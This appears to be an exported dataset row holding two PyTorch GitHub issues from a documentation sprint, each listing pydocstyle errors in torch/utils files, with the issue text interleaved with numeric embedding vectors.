- **File**: `torch/utils/data/datapipes/_decorator.py`, **Entity**: `__init__`, **Line**: 15, **Description**: Docstring is over-indented
- **File**: `torch/utils/data/datapipes/_decorator.py`, **Entity**: `__init__`, **Line**: 15, **Description**: First line should end with a period (not '
- **File**: `torch/utils/data/datapipes/_hook_iterator.py`, **Entity**: `_SnapshotState`, **Line**: 9, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/utils/data/datapipes/_hook_iterator.py`, **Entity**: `_SnapshotState`, **Line**: 9, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/data/datapipes/_hook_iterator.py`, **Entity**: `_simplify_obj_name`, **Line**: 21, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/utils/data/datapipes/_hook_iterator.py`, **Entity**: `_generate_input_args_string`, **Line**: 35, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/utils/data/datapipes/_hook_iterator.py`, **Entity**: `_check_iterator_valid`, **Line**: 68, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/data/datapipes/_hook_iterator.py`, **Entity**: `_set_datapipe_valid_iterator_id`, **Line**: 92, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/utils/data/datapipes/_hook_iterator.py`, **Entity**: `hook_iterator`, **Line**: 110, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/data/datapipes/_hook_iterator.py`, **Entity**: `hook_iterator`, **Line**: 110, **Description**: First line should end with a period (not 'f')
- **File**: `torch/utils/data/datapipes/_hook_iterator.py`, **Entity**: `hook_iterator`, **Line**: 110, **Description**: First line should be in imperative mood; try rephrasing (found 'Hook')
- **File**: `torch/utils/data/datapipes/_hook_iterator.py`, **Entity**: `IteratorDecorator`, **Line**: 121, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/utils/data/datapipes/_hook_iterator.py`, **Entity**: `IteratorDecorator`, **Line**: 121, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/data/datapipes/_hook_iterator.py`, **Entity**: `IteratorDecorator`, **Line**: 121, **Description**: First line should end with a period (not 'o')
- **File**: `torch/utils/data/datapipes/_hook_iterator.py`, **Entity**: `_get_next`, **Line**: 138, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/utils/data/datapipes/_typing.py`, **Entity**: `issubtype`, **Line**: 52, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/data/datapipes/_typing.py`, **Entity**: `_issubtype_with_constraints`, **Line**: 109, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/data/datapipes/_typing.py`, **Entity**: `_DataPipeType`, **Line**: 211, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/utils/data/datapipes/_typing.py`, **Entity**: `_DataPipeType`, **Line**: 211, **Description**: First line should end with a period (not '`')
- **File**: `torch/utils/data/datapipes/_typing.py`, **Entity**: `_DataPipeMeta`, **Line**: 249, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/utils/data/datapipes/_typing.py`, **Entity**: `_DataPipeMeta`, **Line**: 249, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/data/datapipes/_typing.py`, **Entity**: `_DataPipeMeta`, **Line**: 249, **Description**: First line should end with a period (not 'd')
- **File**: `torch/utils/data/datapipes/_typing.py`, **Entity**: `_IterDataPipeMeta`, **Line**: 341, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/data/datapipes/_typing.py`, **Entity**: `_IterDataPipeMeta`, **Line**: 341, **Description**: First line should end with a period (not 's')
- **File**: `torch/utils/data/datapipes/_typing.py`, **Entity**: `conditional_reset`, **Line**: 353, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/data/datapipes/_typing.py`, **Entity**: `conditional_reset`, **Line**: 353, **Description**: First line should end with a period (not 'y')
- **File**: `torch/utils/data/datapipes/_typing.py`, **Entity**: `reinforce_type`, **Line**: 414, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/data/datapipes/_typing.py`, **Entity**: `reinforce_type`, **Line**: 414, **Description**: First line should end with a period (not 'd')
- **File**: `torch/utils/data/datapipes/gen_pyi.py`, **Entity**: `find_file_paths`, **Line**: 31, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/data/datapipes/gen_pyi.py`, **Entity**: `extract_method_name`, **Line**: 45, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/utils/data/datapipes/gen_pyi.py`, **Entity**: `extract_method_name`, **Line**: 45, **Description**: First line should end with a period (not '""')
- **File**: `torch/utils/data/datapipes/gen_pyi.py`, **Entity**: `extract_method_name`, **Line**: 45, **Description**: First line should be in imperative mood (perhaps 'Extract', not 'Extracts')
- **File**: `torch/utils/data/datapipes/gen_pyi.py`, **Entity**: `extract_class_name`, **Line**: 59, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/utils/data/datapipes/gen_pyi.py`, **Entity**: `extract_class_name`, **Line**: 59, **Description**: First line should end with a period (not '""')
- **File**: `torch/utils/data/datapipes/gen_pyi.py`, **Entity**: `extract_class_name`, **Line**: 59, **Description**: First line should be in imperative mood (perhaps 'Extract', not 'Extracts')
- **File**: `torch/utils/data/datapipes/gen_pyi.py`, **Entity**: `parse_datapipe_file`, **Line**: 69, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/utils/data/datapipes/gen_pyi.py`, **Entity**: `split_outside_bracket`, **Line**: 131, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/utils/data/datapipes/gen_pyi.py`, **Entity**: `process_signature`, **Line**: 152, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/data/datapipes/gen_pyi.py`, **Entity**: `process_signature`, **Line**: 152, **Description**: First line should end with a period (not ',')
- **File**: `torch/utils/data/datapipes/gen_pyi.py`, **Entity**: `get_method_definitions`, **Line**: 178, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/data/datapipes/gen_pyi.py`, **Entity**: `get_method_definitions`, **Line**: 178, **Description**: First line should end with a period (not 's')
- **File**: `torch/utils/data/datapipes/gen_pyi.py`, **Entity**: `main`, **Line**: 228, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/data/datapipes/gen_pyi.py`, **Entity**: `main`, **Line**: 228, **Description**: First line should end with a period (not 'n')

cc @carljparker",False,"[-2.09470779e-01 -4.50322449e-01  1.25737097e-02 -1.88822001e-01
 -1.69090051e-02  4.23349626e-02  1.15800709e-01  1.36983488e-02
 -3.90371829e-01  2.38671079e-01 -7.53345713e-02 -1.10584565e-01
  1.73664212e-01  2.73414791e-01 -1.96116209e-01  3.17038417e-01
 -4.18142170e-01 -2.06735909e-01  2.36378476e-01  2.91305423e-01
  3.46093118e-01  3.25811863e-01 -1.59745008e-01  8.83323848e-02
 -3.48070443e-01 -3.86130027e-02 -2.99166501e-01 -2.87689805e-01
 -1.88980028e-01  1.37582481e-01  3.21885824e-01  2.26244420e-01
 -6.29737377e-02  1.74802870e-01  3.26219261e-01  2.66582578e-01
 -1.82337001e-01 -1.59640133e-01  2.25079171e-02  1.16581619e-01
  8.55713114e-02  5.78127205e-02 -1.01650998e-01  8.48539621e-02
  6.28067106e-02 -2.16879606e-01 -2.92698264e-01  1.01073682e-01
 -2.76452184e-01  1.85275942e-01 -8.57162997e-02  2.38408595e-01
 -5.87680101e-01  1.07234746e-01  7.72641599e-02  5.93465194e-02
 -2.02857219e-02  4.01345670e-01  7.01145381e-02 -6.41967505e-02
  1.36533916e-01 -2.76130103e-02  4.96990159e-02  3.57608080e-01
 -2.14050412e-01  3.29194635e-01  3.02022975e-03  2.43349329e-01
  4.14013684e-01 -4.85310614e-01 -2.13236839e-01  1.72387242e-01
 -5.63214540e-01 -1.05897680e-01  5.46542853e-02  1.34384811e-01
 -3.56164157e-01 -2.33911462e-02 -2.84420788e-01 -1.33430779e-01
 -3.67390811e-01 -1.07384600e-01  2.37791017e-01  2.08336174e-01
  3.66195217e-02 -1.09031737e-01  1.59415513e-01 -2.68953204e-01
  1.49065703e-01  6.61536232e-02  5.81227958e-01 -4.94537577e-02
 -2.74052434e-02  3.57199341e-01  1.71196401e-01  3.44029576e-01
  1.94050252e-01 -4.11565080e-02 -4.97664064e-02 -2.27037221e-01
  1.61451548e-01 -2.60344207e-01 -2.49680072e-01  1.71629712e-01
  2.40807518e-01  1.95811242e-02  6.05890937e-02 -2.72152424e-01
  1.22773051e-01  5.13589606e-02  3.11760325e-02  4.97444533e-04
  2.63233125e-01  9.52194929e-02  2.26854742e-01  2.22501010e-02
 -4.12355810e-01  7.59076476e-02 -3.86947334e-01  1.26190409e-01
  1.68202698e-01  3.61082405e-01  2.49776766e-02  1.15829639e-01
  2.22114101e-02  2.60869376e-02  2.59228766e-01 -1.13754626e-02
 -1.68833453e-02 -2.68741101e-01  3.73455107e-01 -7.69004226e-02
 -9.90610495e-02  1.10226467e-01  6.49981946e-02 -3.59807462e-02
 -1.11325838e-01 -4.63651240e-01 -3.87919605e-01 -1.93606764e-01
 -3.78490537e-01 -1.09713495e-01 -1.76826388e-01 -7.66458288e-02
  4.32647377e-01  3.85627955e-01 -4.35435653e-01  4.54661459e-01
  1.76715013e-02  2.99606085e-01  5.71109876e-02  1.44934773e-01
 -2.74314821e-01  4.48834270e-01 -5.92204332e-02  1.71558887e-01
  5.99160135e-01  5.68831488e-02 -1.15952946e-01 -4.85329390e-01
  4.71215025e-02  3.35464567e-01  2.95303366e-03 -2.62372553e-01
 -7.74315298e-02  3.19394842e-02 -1.45140558e-01  9.56540033e-02
 -4.63877678e-01 -1.15448780e-01  1.15609042e-01  1.69916391e-01
 -1.72459796e-01 -1.44337431e-01  5.94881140e-02  1.64888069e-01
 -2.47497663e-01 -3.43005419e-01  5.41358814e-02  1.26720220e-01
 -4.71780039e-02  3.49185348e-01  1.09527990e-01 -1.79641053e-01
 -1.09250940e-01  1.93614230e-01  1.90683752e-01  5.17150611e-02
  1.91640258e-01  1.15674824e-01  6.02866895e-02 -2.83888698e-01
  3.77393007e-01  8.90243948e-02 -2.14762419e-01 -1.40470743e-01
  4.18723285e-01  5.07990539e-01 -9.36425924e-02  2.17900679e-01
 -1.35588408e-01  2.10767686e-01  3.45072716e-01 -1.93490665e-02
  4.58563000e-01 -5.10584638e-02 -2.88102746e-01 -2.66903996e-01
 -2.96834290e-01  1.36950135e-01 -3.66492033e-01 -1.21099293e-01
 -1.74347878e-01 -4.41067398e-01 -2.86237478e-01  3.73642623e-01
  2.50588685e-01  1.17747806e-01  7.89047927e-02 -2.92138815e-01
 -2.98454702e-01 -1.69322062e-02 -4.13896739e-02 -2.26269111e-01
  1.50250643e-01  5.42406440e-02 -1.04722247e-01  1.39937550e-01
 -1.06143080e-01 -8.25822204e-02 -1.00498497e-01 -6.91874251e-02
  7.64794648e-01 -1.03701517e-01  1.38380259e-01  1.56772614e-01
 -3.75104509e-03 -3.08296774e-02  1.76471815e-01  2.83264875e-01
 -1.74632043e-01  1.33442298e-01 -2.97078729e-01 -6.73842356e-02
  4.83559072e-02 -2.27577403e-01 -1.01122797e-01 -3.11355382e-01
 -4.32732880e-01  6.96317758e-03 -4.48351145e-01 -5.21607101e-01
  3.68331760e-01  3.82979847e-02  5.64196229e-01  1.13307208e-01
 -4.94214475e-01 -1.39208779e-01  1.62151352e-01  9.77335796e-02
  1.11268520e-01  1.93670869e-01 -1.00984730e-01  3.27093214e-01
  4.57537055e-01 -1.78686738e-01 -2.41787553e-01  9.22821313e-02
  2.32232302e-01 -8.34425390e-02  7.45983049e-02 -4.86572057e-01
  4.29791093e-01  2.07126439e-01  4.22306478e-01  1.40970618e-01
  3.08914900e-01 -4.76337038e-02 -5.58121763e-02  9.62366015e-02
  4.25010845e-02  3.63634765e-01 -3.76079500e-01 -1.11646950e-01
  2.60107040e-01 -4.00345027e-02  4.58910465e-02 -3.46151978e-01
 -4.89568025e-01 -7.61452913e-02 -8.70739371e-02  4.54064980e-02
  4.20995057e-01 -4.20249104e-02  8.33392218e-02 -9.97486524e-04
  2.48679165e-02  1.63596630e-01  3.11816603e-01  1.69148847e-01
 -7.29789615e-01 -1.34658232e-01 -1.45051688e-01  1.41712785e-01
  2.55582899e-01  2.61547476e-01  3.57951820e-01  2.12384492e-01
 -1.55252386e-02 -4.08419311e-01  3.90354872e-01  1.85038522e-01
 -4.35038745e-01 -1.46891207e-01  5.49971983e-02 -1.84901446e-01
 -2.66152304e-02  4.82788980e-01  2.22471729e-01  5.08237109e-02
 -3.00794989e-01 -3.84734869e-01 -3.29121321e-01 -5.25785610e-02
  6.54998273e-02 -2.15872064e-01 -2.42772445e-01  2.10818529e-01
 -7.18608573e-02 -2.09215999e-01  1.41388878e-01  2.39403367e-01
 -1.42742276e-01 -5.30144572e-02  1.82181373e-01  2.26486456e-02
 -1.88703880e-01  1.29425108e-01  5.71803898e-02 -5.06931424e-01
  4.30267975e-02 -2.51291811e-01  1.01530343e-01 -5.78499198e-01
 -1.14769414e-01 -2.88400888e-01  1.44513041e-01  6.51047409e-01
 -1.82634562e-01 -1.17549852e-01  7.31346130e-01 -1.73594862e-01
 -2.33555406e-01  2.11272165e-02 -1.26485407e-01  4.32135552e-01
  1.20165847e-01 -3.45760696e-02  1.06264964e-01  3.00051093e-01
 -5.38451791e-01 -1.10082120e-01 -4.04498398e-01 -4.16875005e-01
  2.84389630e-02 -1.91460669e-01  8.57250169e-02  6.75212294e-02
  9.01573300e-02  2.33813286e-01 -5.68894446e-01  1.07761219e-01
 -1.78026348e-01  1.40705079e-01  1.60362095e-01  1.67752534e-01
  1.22486494e-01  1.13330455e-03  2.30453759e-01 -2.60819286e-01
 -5.70165813e-01  2.42525473e-01  3.24186862e-01 -4.17735636e-01]"
"Fix docstring errors in backend_registration.py, _pytree.py, _foreach_utils.py, flop_counter.py, collect_env.py, checkpoint.py, cpp_extension.py, _python_dispatch.py module: docs triaged medium docathon-h2-2023","Please fix the following issues. To test locally, run: 
 ```
pydocstyle path-to-file --count
```
Run this command before and after fixing the errors. This command prints out the number of errors at the end of the output. Paste the output to your PR description with the number before and after. 
- **File**: `torch/utils/collect_env.py`, **Entity**: `run`, **Line**: 51, **Description**: First line should end with a period (not ')')
- **File**: `torch/utils/collect_env.py`, **Entity**: `run`, **Line**: 51, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/utils/collect_env.py`, **Entity**: `run_and_read_all`, **Line**: 67, **Description**: First line should end with a period (not '0')
- **File**: `torch/utils/collect_env.py`, **Entity**: `run_and_read_all`, **Line**: 67, **Description**: First line should be in imperative mood (perhaps 'Run', not 'Runs')
- **File**: `torch/utils/collect_env.py`, **Entity**: `run_and_parse_first_match`, **Line**: 75, **Description**: First line should end with a period (not 's')
- **File**: `torch/utils/collect_env.py`, **Entity**: `run_and_parse_first_match`, **Line**: 75, **Description**: First line should be in imperative mood (perhaps 'Run', not 'Runs')
- **File**: `torch/utils/collect_env.py`, **Entity**: `run_and_return_first_line`, **Line**: 85, **Description**: First line should end with a period (not 'y')
- **File**: `torch/utils/collect_env.py`, **Entity**: `run_and_return_first_line`, **Line**: 85, **Description**: First line should be in imperative mood (perhaps 'Run', not 'Runs')
- **File**: `torch/utils/collect_env.py`, **Entity**: `get_cudnn_version`, **Line**: 156, **Description**: First line should end with a period (not 'd')
- **File**: `torch/utils/collect_env.py`, **Entity**: `get_cudnn_version`, **Line**: 156, **Description**: First line should be in imperative mood; try rephrasing (found 'This')
- **File**: `torch/utils/collect_env.py`, **Entity**: `get_pip_packages`, **Line**: 376, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/collect_env.py`, **Entity**: `get_pip_packages`, **Line**: 376, **Description**: Multi-line docstring closing quotes should be on a separate line
- **File**: `torch/utils/collect_env.py`, **Entity**: `get_pip_packages`, **Line**: 376, **Description**: First line should end with a period (not 'h')
- **File**: `torch/utils/collect_env.py`, **Entity**: `get_pip_packages`, **Line**: 376, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/utils/cpp_extension.py`, **Entity**: `_find_cuda_home`, **Line**: 91, **Description**: Use """"""triple double quotes"""""" (found '''-quotes)
- **File**: `torch/utils/cpp_extension.py`, **Entity**: `_find_cuda_home`, **Line**: 91, **Description**: First line should be in imperative mood (perhaps 'Find', not 'Finds')
- **File**: `torch/utils/cpp_extension.py`, **Entity**: `_find_rocm_home`, **Line**: 121, **Description**: Use """"""triple double quotes"""""" (found '''-quotes)
- **File**: `torch/utils/cpp_extension.py`, **Entity**: `_find_rocm_home`, **Line**: 121, **Description**: First line should be in imperative mood (perhaps 'Find', not 'Finds')
- **File**: `torch/utils/cpp_extension.py`, **Entity**: `_join_rocm_home`, **Line**: 146, **Description**: Use """"""triple double quotes"""""" (found '''-quotes)
- **File**: `torch/utils/cpp_extension.py`, **Entity**: `_join_rocm_home`, **Line**: 146, **Description**: First line should be in imperative mood (perhaps 'Join', not 'Joins')
- **File**: `torch/utils/cpp_extension.py`, **Entity**: `get_default_build_root`, **Line**: 263, **Description**: Use """"""triple double quotes"""""" (found '''-quotes)
- **File**: `torch/utils/cpp_extension.py`, **Entity**: `get_default_build_root`, **Line**: 263, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/utils/cpp_extension.py`, **Entity**: `check_compiler_ok_for_platform`, **Line**: 278, **Description**: Use """"""triple double quotes"""""" (found '''-quotes)
- **File**: `torch/utils/cpp_extension.py`, **Entity**: `check_compiler_ok_for_platform`, **Line**: 278, **Description**: First line should be in imperative mood (perhaps 'Verify', not 'Verifies')
- **File**: `torch/utils/cpp_extension.py`, **Entity**: `get_compiler_abi_compatibility_and_version`, **Line**: 319, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/cpp_extension.py`, **Entity**: `get_compiler_abi_compatibility_and_version`, **Line**: 319, **Description**: Use """"""triple double quotes"""""" (found '''-quotes)
- **File**: `torch/utils/cpp_extension.py`, **Entity**: `get_compiler_abi_compatibility_and_version`, **Line**: 319, **Description**: First line should end with a period (not 'e')
- **File**: `torch/utils/cpp_extension.py`, **Entity**: `BuildExtension`, **Line**: 430, **Description**: Use """"""triple double quotes"""""" (found '''-quotes)
- **File**: `torch/utils/cpp_extension.py`, **Entity**: `with_options`, **Line**: 457, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/cpp_extension.py`, **Entity**: `with_options`, **Line**: 457, **Description**: Use """"""triple double quotes"""""" (found '''-quotes)
- **File**: `torch/utils/cpp_extension.py`, **Entity**: `with_options`, **Line**: 457, **Description**: First line should end with a period (not 'd')
- **File**: `torch/utils/cpp_extension.py`, **Entity**: `with_options`, **Line**: 457, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/utils/cpp_extension.py`, **Entity**: `CppExtension`, **Line**: 908, **Description**: Use """"""triple double quotes"""""" (found '''-quotes)
- **File**: `torch/utils/cpp_extension.py`, **Entity**: `CppExtension`, **Line**: 908, **Description**: First line should be in imperative mood (perhaps 'Create', not 'Creates')
- **File**: `torch/utils/cpp_extension.py`, **Entity**: `CUDAExtension`, **Line**: 954, **Description**: Use """"""triple double quotes"""""" (found '''-quotes)
- **File**: `torch/utils/cpp_extension.py`, **Entity**: `CUDAExtension`, **Line**: 954, **Description**: First line should be in imperative mood (perhaps 'Create', not 'Creates')
- **File**: `torch/utils/cpp_extension.py`, **Entity**: `include_paths`, **Line**: 1125, **Description**: Use """"""triple double quotes"""""" (found '''-quotes)
- **File**: `torch/utils/cpp_extension.py`, **Entity**: `library_paths`, **Line**: 1159, **Description**: Use """"""triple double quotes"""""" (found '''-quotes)
- **File**: `torch/utils/cpp_extension.py`, **Entity**: `load`, **Line**: 1206, **Description**: Use """"""triple double quotes"""""" (found '''-quotes)
- **File**: `torch/utils/cpp_extension.py`, **Entity**: `load`, **Line**: 1206, **Description**: First line should be in imperative mood (perhaps 'Load', not 'Loads')
- **File**: `torch/utils/cpp_extension.py`, **Entity**: `load_inline`, **Line**: 1315, **Description**: First line should be in imperative mood (perhaps 'Load', not 'Loads')
- **File**: `torch/utils/cpp_extension.py`, **Entity**: `is_ninja_available`, **Line**: 1633, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/cpp_extension.py`, **Entity**: `is_ninja_available`, **Line**: 1633, **Description**: Use """"""triple double quotes"""""" (found '''-quotes)
- **File**: `torch/utils/cpp_extension.py`, **Entity**: `is_ninja_available`, **Line**: 1633, **Description**: First line should end with a period (not 's')
- **File**: `torch/utils/cpp_extension.py`, **Entity**: `is_ninja_available`, **Line**: 1633, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/utils/cpp_extension.py`, **Entity**: `verify_ninja_availability`, **Line**: 1646, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/cpp_extension.py`, **Entity**: `verify_ninja_availability`, **Line**: 1646, **Description**: Use """"""triple double quotes"""""" (found '''-quotes)
- **File**: `torch/utils/cpp_extension.py`, **Entity**: `verify_ninja_availability`, **Line**: 1646, **Description**: First line should end with a period (not 't')
- **File**: `torch/utils/cpp_extension.py`, **Entity**: `verify_ninja_availability`, **Line**: 1646, **Description**: First line should be in imperative mood (perhaps 'Raise', not 'Raises')
- **File**: `torch/utils/cpp_extension.py`, **Entity**: `_get_cuda_arch_flags`, **Line**: 1719, **Description**: Use """"""triple double quotes"""""" (found '''-quotes)
- **File**: `torch/utils/cpp_extension.py`, **Entity**: `_join_cuda_home`, **Line**: 2231, **Description**: Use """"""triple double quotes"""""" (found '''-quotes)
- **File**: `torch/utils/cpp_extension.py`, **Entity**: `_join_cuda_home`, **Line**: 2231, **Description**: First line should be in imperative mood (perhaps 'Join', not 'Joins')
- **File**: `torch/utils/flop_counter.py`, **Entity**: `mm_flop`, **Line**: 20, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/utils/flop_counter.py`, **Entity**: `addmm_flop`, **Line**: 32, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/utils/flop_counter.py`, **Entity**: `addmm_flop`, **Line**: 32, **Description**: First line should end with a period (not 'm')
- **File**: `torch/utils/flop_counter.py`, **Entity**: `bmm_flop`, **Line**: 38, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/utils/flop_counter.py`, **Entity**: `baddbmm_flop`, **Line**: 52, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/utils/flop_counter.py`, **Entity**: `conv_flop_count`, **Line**: 66, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/flop_counter.py`, **Entity**: `conv_flop_count`, **Line**: 66, **Description**: First line should end with a period (not 's')
- **File**: `torch/utils/flop_counter.py`, **Entity**: `conv_flop`, **Line**: 89, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/utils/flop_counter.py`, **Entity**: `sdpa_flop_count`, **Line**: 122, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/flop_counter.py`, **Entity**: `sdpa_flop`, **Line**: 140, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/utils/flop_counter.py`, **Entity**: `sdpa_backward_flop`, **Line**: 175, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/utils/flop_counter.py`, **Entity**: `FlopCounterMode`, **Line**: 218, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/utils/flop_counter.py`, **Entity**: `FlopCounterMode`, **Line**: 218, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/flop_counter.py`, **Entity**: `FlopCounterMode`, **Line**: 218, **Description**: First line should end with a period (not 'f')
- **File**: `torch/utils/flop_counter.py`, **Entity**: `get_flop_counts`, **Line**: 329, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/flop_counter.py`, **Entity**: `get_flop_counts`, **Line**: 329, **Description**: First line should end with a period (not 'r')
- **File**: `torch/utils/flop_counter.py`, **Entity**: `get_flop_counts`, **Line**: 329, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/utils/_foreach_utils.py`, **Entity**: `_get_foreach_kernels_supported_devices`, **Line**: 8, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/utils/_foreach_utils.py`, **Entity**: `_get_fused_kernels_supported_devices`, **Line**: 14, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/utils/_python_dispatch.py`, **Entity**: `TorchDispatchMode`, **Line**: 17, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/utils/_python_dispatch.py`, **Entity**: `TorchDispatchMode`, **Line**: 17, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/_python_dispatch.py`, **Entity**: `TorchDispatchMode`, **Line**: 17, **Description**: First line should end with a period (not 'l')
- **File**: `torch/utils/_pytree.py`, **Entity**: `tree_flatten`, **Line**: 271, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/_pytree.py`, **Entity**: `tree_flatten`, **Line**: 271, **Description**: First line should end with a period (not 'd')
- **File**: `torch/utils/_pytree.py`, **Entity**: `tree_unflatten`, **Line**: 293, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/_pytree.py`, **Entity**: `map_only`, **Line**: 352, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/_pytree.py`, **Entity**: `map_only`, **Line**: 352, **Description**: First line should end with a period (not 'g')
- **File**: `torch/utils/backend_registration.py`, **Entity**: `rename_privateuse1_backend`, **Line**: 14, **Description**: Docstring is over-indented
- **File**: `torch/utils/backend_registration.py`, **Entity**: `rename_privateuse1_backend`, **Line**: 14, **Description**: First line should end with a period (not 'e')
- **File**: `torch/utils/backend_registration.py`, **Entity**: `rename_privateuse1_backend`, **Line**: 14, **Description**: First line should not be the function's ""signature""
- **File**: `torch/utils/backend_registration.py`, **Entity**: `wrap_tensor_to`, **Line**: 137, **Description**: First line should be in imperative mood (perhaps 'Perform', not 'Performs')
- **File**: `torch/utils/backend_registration.py`, **Entity**: `wrap_module_to`, **Line**: 169, **Description**: First line should be in imperative mood (perhaps 'Move', not 'Moves')
- **File**: `torch/utils/backend_registration.py`, **Entity**: `wrap_storage_backend`, **Line**: 193, **Description**: First line should end with a period (not '`')
- **File**: `torch/utils/backend_registration.py`, **Entity**: `wrap_storage_backend`, **Line**: 193, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/utils/backend_registration.py`, **Entity**: `wrap_storage_to`, **Line**: 200, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/utils/backend_registration.py`, **Entity**: `generate_methods_for_privateuse1_backend`, **Line**: 260, **Description**: Docstring is over-indented
- **File**: `torch/utils/backend_registration.py`, **Entity**: `generate_methods_for_privateuse1_backend`, **Line**: 260, **Description**: First line should end with a period (not 'e')
- **File**: `torch/utils/backend_registration.py`, **Entity**: `generate_methods_for_privateuse1_backend`, **Line**: 260, **Description**: First line should not be the function's ""signature""
- **File**: `torch/utils/checkpoint.py`, **Entity**: `DefaultDeviceType`, **Line**: 70, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/utils/checkpoint.py`, **Entity**: `DefaultDeviceType`, **Line**: 70, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/checkpoint.py`, **Entity**: `checkpoint`, **Line**: 300, **Description**: First line should end with a period (not 'l')
- **File**: `torch/utils/checkpoint.py`, **Entity**: `checkpoint_sequential`, **Line**: 444, **Description**: First line should be in imperative mood; try rephrasing (found 'A')
- **File**: `torch/utils/checkpoint.py`, **Entity**: `set_checkpoint_early_stop`, **Line**: 663, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/checkpoint.py`, **Entity**: `set_checkpoint_early_stop`, **Line**: 663, **Description**: First line should end with a period (not 'n')
- **File**: `torch/utils/checkpoint.py`, **Entity**: `_checkpoint_without_reentrant`, **Line**: 1089, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/checkpoint.py`, **Entity**: `_checkpoint_without_reentrant`, **Line**: 1089, **Description**: First line should end with a period (not 'd')

cc @carljparker",False,"[-0.14713812 -0.3235804  -0.19064504 -0.11056159  0.0727222  -0.03736098
 -0.06957217  0.07257326 -0.3883161   0.07342421 -0.01120386 -0.02554991
  0.21622263  0.15259069  0.03405947  0.24454239 -0.2562791  -0.27512264
  0.32589313  0.08652739  0.05922896  0.46986994 -0.14696643 -0.00310126
 -0.30249238  0.10150552 -0.372682   -0.12211318 -0.08070195  0.10010039
  0.24068558  0.26766622 -0.35066736 -0.01983579  0.49285215  0.39281967
 -0.28219625 -0.29531372  0.03705089  0.0381455   0.01379485 -0.20626166
 -0.24151175  0.00770284  0.02963538 -0.22285521 -0.13656445  0.31286687
 -0.16085097  0.09116861  0.04359648  0.12979126 -0.19813314 -0.12233533
  0.19638135  0.11640266 -0.07677907  0.6518502   0.01376962 -0.06065933
  0.09705374  0.31389004 -0.1827004   0.12498233 -0.24120545  0.22322081
 -0.01234576  0.19518211  0.3482247  -0.10284157 -0.11890689  0.06223841
 -0.54338    -0.22580276 -0.04168175  0.37361887 -0.32443786 -0.12449467
 -0.29610926 -0.34100178 -0.1854819   0.05995443  0.0721775   0.09220078
  0.15163502 -0.22355482  0.2053803  -0.07845616  0.26460475  0.17506641
  0.55725515 -0.22110194 -0.05123261  0.32066792  0.04514587  0.3194754
  0.00515256 -0.02158923 -0.03869584 -0.1887425   0.25914973 -0.43840078
